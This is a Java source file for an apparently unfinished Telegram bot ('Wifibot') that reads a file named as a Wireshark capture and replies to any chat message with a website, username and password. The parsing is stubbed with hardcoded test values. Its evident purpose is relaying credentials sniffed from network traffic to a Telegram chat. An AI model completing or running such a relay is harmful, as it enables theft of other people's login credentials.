package main;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;

import org.telegram.telegrambots.bots.TelegramLongPollingBot;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.Update;
import org.telegram.telegrambots.meta.exceptions.TelegramApiException;

public class Wifibot extends TelegramLongPollingBot {
	
	private static final String WIRESHARK_PATH = "files/prueba.txt";
	
	@Override
	public void onUpdateReceived(Update arg0) {
		final String messageTextReceived = arg0.getMessage().getText();
		final long chatId = arg0.getMessage().getChatId();
		
		String[] data = parseFile();
		
		String messageTextSend = "Página web: " + data[0] + "\n";
		messageTextSend += "Usuario: " + data[1] + "\n";
		messageTextSend += "Contraseña: " + data[2];
		
		SendMessage message = new SendMessage().setChatId(chatId).setText(messageTextSend);
		
		try {
			execute(message);
		} catch (TelegramApiException e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public String getBotUsername() {
		return "Wifibot";
	}
	
	@Override
	public String getBotToken() {
		return "TOKEN AQUÍ";
	}
	
	// Leer y parsear fichero
	public String[] parseFile() {
		String[] output = new String[3]; // Página web, user, password
		String wiresharkContent = readFile(WIRESHARK_PATH);
		
		// test
		System.out.println(wiresharkContent);
		output = new String[] {"Instagram", "usuario25", "password123"};
		// test
		
		return output;
	}
	
	public String readFile(String path) {
		File file = new File(path);
		FileInputStream fis = null;
		byte[] data = new byte[(int)file.length()];
		
		try {
			fis = new FileInputStream(file);
			fis.read(data);
			return new String(data);
		} catch (IOException e) {
			e.printStackTrace();
		} finally {
			try {
				if(fis != null) {
					fis.close();
				}
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return null;
	}
	// FIN Leer y parsear fichero
	
	
}
